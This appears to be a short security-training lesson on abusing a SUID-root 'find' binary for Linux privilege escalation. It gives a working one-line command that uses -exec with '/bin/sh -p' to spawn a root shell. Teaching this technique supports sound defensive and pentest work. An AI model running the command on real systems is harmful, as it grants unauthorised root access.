The 'find' -exec Option

  • The -exec option allows 'find' to execute a specified command on each file found.
  • If 'find' is SUID, the command executed via -exec will inherit its elevated privileges.
  • This creates a direct path to running commands as the owner of the 'find' binary (e.g., root).

Understanding /bin/sh -p

  • The -p flag for sh (or bash) ensures that the shell retains the effective user ID.
  • Without -p, the shell might drop privileges, preventing you from getting a root shell.
  • This is crucial for maintaining the elevated context gained from the SUID binary.
Key Takeaway

SUID 'find' can be exploited by using -exec /bin/sh -p \; -quit to spawn a root shell, making it a high-priority target for privilege escalation.

SUID 'find' Exploitation
# Assume 'find' is SUID root
# Execute a root shell
find . -exec /bin/sh -p \; -quit

# Inside the new shell:
whoami
# Expected output: root

# Exit the root shell
exit

# Back to original user
whoami
# Expected output: your_user
Misconception: Simple 'sh'

Simply running find . -exec /bin/sh \; -quit might not work. The -p flag is crucial for preserving effective user ID in SUID contexts, preventing privilege drops.
